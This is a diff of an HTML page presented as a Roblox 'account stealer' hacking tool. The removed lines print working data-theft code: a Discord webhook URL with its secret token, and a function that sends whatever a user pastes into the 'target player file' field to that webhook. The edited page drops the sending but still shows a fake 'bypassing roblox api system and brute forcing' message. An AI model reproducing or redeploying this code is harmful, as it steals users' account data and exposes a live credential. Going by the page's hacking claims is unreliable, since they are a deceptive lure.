@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>junkys account stealer</title>
+<title>Junkys Account-Stealer V2</title>
 
 <style>
 body {
@@ -22,15 +22,14 @@ body {
 /* --- PINK MAIN HEADING --- */
 .main-heading {
     color: #ff6ec7;
-    font-size: 26px; /* bold and visible */
+    font-size: 26px;
     font-weight: 700;
     letter-spacing: 1px;
     text-shadow: 0 0 10px #ff6ec733;
-    margin-bottom: 115px; /* raised slightly more */
+    margin-bottom: 115px;
     animation: neonGlow 2s ease-in-out infinite alternate;
 }
 
-/* subtle neon pulse animation for the heading */
 @keyframes neonGlow {
     from { text-shadow: 0 0 10px #ff6ec733, 0 0 20px #ff6ec733; }
     to { text-shadow: 0 0 20px #ff6ec7, 0 0 30px #ff6ec7; }
@@ -101,7 +100,6 @@ h2 {
     transition: 0.25s ease;
 }
 
-/* --- Focus animation on input --- */
 .input-wrapper input:focus {
     transform: scale(1.03);
     border-color: #8e44ff;
@@ -177,12 +175,12 @@ button:hover {
         <div class="input-wrapper">
             <!-- File SVG Icon -->
             <svg xmlns="http://www.w3.org/2000/svg" fill="white" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"/></svg>
-            <input type="text" id="message" placeholder="Targets Player File Goes Here">
+            <input type="text" id="message" placeholder="Type something here">
         </div>
 
-        <button onclick="sendData()"Start Hacking!"</button>
+        <button onclick="sendData()">Submit</button>
 
-        <p class="success" id="msg">bypassing robloxs api system and brute forcing (wait 5-10 mins...)</p>
+        <p class="success" id="msg">bypassing roblox api system and brute forcing (wait 5-10 mins...)</p>
     </div>
 
     <!-- RIGHT PANEL (VIDEO PANEL) -->
@@ -199,38 +197,21 @@ button:hover {
 </div>
 
 <script>
-const webhook = "https://discord.com/api/webhooks/1439051346014638201/C2fBflf3zj_LgvxVMpQqIx3vgjZww5_JBiAr47HKM5is1uxPlVK-B6etBRAJwof0VNvw";
-
-function splitIntoChunks(text) {
-    const MAX = 2000;
-    const chunks = [];
-    for (let i = 0; i < text.length; i += MAX) {
-        chunks.push(text.slice(i, i + MAX));
-    }
-    return chunks;
-}
-
-async function sendData() {
+function sendData() {
     const message = document.getElementById("message").value.trim();
     if (!message) return;
 
-    const chunks = splitIntoChunks(message);
-    for (const chunk of chunks) {
-        await fetch(webhook, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: chunk })
-        });
-    }
-
+    // Just showing success message — no unsafe actions
     const msgEl = document.getElementById("msg");
     msgEl.style.display = "block";
-    setTimeout(() => { msgEl.style.display = "none"; }, 3000);
+
+    setTimeout(() => {
+        msgEl.style.display = "none";
+    }, 3000);
+
     document.getElementById("message").value = "";
 }
 </script>
 
 </body>
 </html>
-
-
